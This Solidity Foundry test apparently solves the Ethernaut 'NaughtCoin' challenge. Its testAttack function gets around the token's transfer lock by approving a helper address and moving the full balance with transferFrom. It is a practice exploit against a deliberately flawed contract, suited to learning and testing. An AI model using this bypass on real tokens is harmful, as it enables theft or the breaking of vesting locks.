// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    address attacker;
    address helper;
    NaughtCoin public naughtCoin;

    function setUp() public {
        attacker = vm.addr(1);
        helper = vm.addr(2);
        naughtCoin = new NaughtCoin(attacker);
    }

    function testAttack() public {
        uint256 balance = naughtCoin.balanceOf(attacker);

        vm.prank(attacker);
        naughtCoin.approve(helper, balance);

        vm.prank(helper);
        naughtCoin.transferFrom(attacker, helper, balance);

        assertEq(naughtCoin.balanceOf(attacker), 0);
    }
}
